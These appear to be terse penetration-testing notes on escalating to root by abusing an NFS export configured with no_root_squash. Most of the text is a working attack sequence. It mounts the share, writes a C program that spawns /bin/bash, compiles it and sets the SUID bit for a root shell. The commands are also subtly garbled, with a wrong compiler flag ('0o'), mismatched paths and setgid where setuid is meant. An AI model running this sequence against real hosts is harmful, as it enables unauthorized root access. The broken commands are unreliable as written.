NFS Root Squashing 

* cat /etc/exports 
* looking for no_root_squash
	* means that the /tmp folder is sharable and can be mounted 
```
showmount -e IP
mkdir /tmp/mountme
mount -o rw,vers=2 IP:/tmp /tmp/mountme
Making the malicious C file 

echo 'int main() { setgid(0); system("/bin/bash"); return 0;}' > /tmp/mount/x.c

gcc /tmp/mountme/x.c 0o /tmp/mountme/x

chmod +s /tmp/mountme/x

```

* Root_squash - have root access to the system 
* 